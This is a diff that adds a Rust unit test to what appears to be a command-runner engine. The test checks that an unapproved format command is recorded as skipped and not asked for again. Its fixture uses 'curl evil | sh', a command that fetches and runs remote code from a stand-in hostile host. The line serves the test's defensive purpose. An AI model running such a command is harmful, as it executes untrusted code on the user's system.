@@ -756,6 +756,31 @@ fn t4_epa_fans_out_and_write_test_is_serial() {
 }
 
 #[test]
+fn a1_an_unapproved_format_command_is_skipped_once() {
+    let phases = json!([phase(1, "p", &[], "Required")]);
+    let mut h = H::plan_approved(&["p"], phases, SessionOptions::default());
+    h.pass_phase(1);
+    assert_eq!(h.summaries(), vec!["command format p"]);
+    // Rule A1: the runner records the skip as a format step with no exit code.
+    h.ev(SessionEvent::CommandRan {
+        purpose: CommandPurpose::Format,
+        project: "p".into(),
+        command: "curl evil | sh".into(),
+        exit_code: None,
+        output_tail: ostra_engine::runner::FORMAT_NOT_APPROVED.into(),
+    });
+    let st = h.state();
+    assert_eq!(st.project_tracks["p"].format, Some(None));
+    assert!(
+        !h.summaries()
+            .iter()
+            .any(|s| s.starts_with("command format")),
+        "format is not asked for again: {:?}",
+        h.summaries()
+    );
+}
+
+#[test]
 fn t6_closing_gate_is_batched() {
     let phases = json!([
         phase(1, "a", &[], "Required"),
